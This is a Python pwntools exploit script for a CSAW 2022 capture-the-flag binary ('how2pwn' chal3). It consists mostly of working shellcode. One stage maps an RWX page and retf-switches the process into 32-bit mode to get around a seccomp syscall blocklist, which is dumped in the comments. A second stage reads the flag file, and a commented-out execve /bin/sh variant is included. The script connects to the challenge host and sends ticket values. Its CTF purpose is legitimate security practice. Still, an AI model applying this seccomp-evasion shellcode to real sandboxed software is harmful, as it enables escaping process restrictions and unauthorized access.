
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./public/bin/all/chal3')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

b *main

# call   rdx
hbreak *main+0x74
hbreak *0xcafe0000

continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def craft_shellcode_stage1():
    shellcode = asm('''
    // void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
    // unsigned long mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long pgoff);
    xor rax,rax
    mov al,  9
    mov edi, 0xcafe0000 
    mov rsi, 0x2000
    mov rdx,0x7  /* RWX */
    mov r10,0x32 /* MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED */
    xor r8,r8
    xor r9,r9
    syscall

    // eax = 0xcafe0000
    // ssize_t read(unsigned int fd, char __user *buf, size_t count)
    xor rdi,rdi
    mov rsi, rax
    mov rdx, 0x1000
    mov eax, 0
    syscall

    // jump to 32-bit assembly via `retf`
    mov eax, 0xcafe0000
    mov ebx, 0x23
    sub rsp, 8
    mov dword ptr [rsp], eax
    mov dword ptr [rsp+4], ebx
    ''')
    shellcode += b'\xcb' # retf so that we switch processor mode to 32-bit.

    padded_shellcode = shellcode + b'\x90'*(0x100 - len(shellcode)) # pad with NOPs.
    assert(len(padded_shellcode) == 0x100)
    return padded_shellcode

def craft_shellcode_stage2():
    # x86 execve shellcode
    # This did not work as the child inherits the seccomp filter.
    # The process terminates with SIGSYS
    # int execve(const char *pathname, char *const argv[], char *const envp[]);
    # ebx = pathname
    # ecx = argv
    # edx = envp
    # eax = syscallno
    # with context.local(arch='i386', bits=32):
    #     shellcode = asm(f'''
    #     xor     edx, edx
    #     lea ebx, [binsh]
    #     mov     esp, 0xcafe1000 /* pivot stack */
    #     push    edx
    #     push    ebx
    #     mov     ecx, esp
    #     mov     eax, 0x0b
    #     int 0x80

    #     hang:
    #     jmp hang

    #     /************* Data section *************/
    #     // We do add a NULL byte in the end because we do not care
    #     binsh:
    #     .ascii "/bin/sh\\0"
    #     ''', vma=0xcafe0000)

    # similarly, pwnlib.shellcraft.i386.linux.sh() will not work because of the inherited seccomp filter.
    # We get SIGSYS, which is how seccomp violating processes get killed

    with context.local(arch='i386', bits=32):
        flag_file = '/flag' if args['REMOTE'] else './public/bin/flag'
        shellcode = asm(
            '''
            mov     esp, 0xcafe1000
            xor     edx, edx /* O_RDONLY */
            ''' +
            pwnlib.shellcraft.i386.linux.cat(flag_file)
        )
    
    padded_shellcode = shellcode + b'\x90'*(0x2000 - len(shellcode)) # pad with NOPs.
    assert(len(padded_shellcode) == 0x2000)
    return padded_shellcode

ticket1 = b'764fce03d863b5155db4af260374acc1'
ticket2 = b'8e7bd9e37e38a85551d969e29b77e1ce'

# nikos@ctf-box:~/ctfs/csaw22/pwn/how2pwn$ seccomp-tools dump ./public/bin/all/chal3
# 8e7bd9e37e38a85551d969e29b77e1ce
# Enter your shellcode:
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0001: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0003
#  0002: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0003: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0005
#  0004: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0005: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0007
#  0006: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0007: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0009
#  0008: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0009: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0011
#  0010: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0011: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0013
#  0012: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0013: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0015
#  0014: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0015: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0017
#  0016: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0017: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0019
#  0018: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0019: 0x15 0x00 0x01 0x0000003e  if (A != kill) goto 0021
#  0020: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0021: 0x15 0x00 0x01 0x000000c8  if (A != tkill) goto 0023
#  0022: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0023: 0x15 0x00 0x01 0x000000ea  if (A != tgkill) goto 0025
#  0024: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#
# So we have a bunch of blacklisted syscalls.

if args['REMOTE']:
    remote_server = 'how2pwn.chal.csaw.io'
    remote_port = 60003
    io = remote(remote_server, remote_port)
else:
    io = start()

shellcode_stage1 = craft_shellcode_stage1()
shellcode_stage2 = craft_shellcode_stage2()

io.send(ticket2)
io.recvuntil(b'Enter your shellcode: ')

io.send(shellcode_stage1)
io.send(shellcode_stage2)

io.interactive()
io.close()

# ticket received: 7a01505a0cfefc2f8249cb24e01a2890


# Found ticket: XXXXXX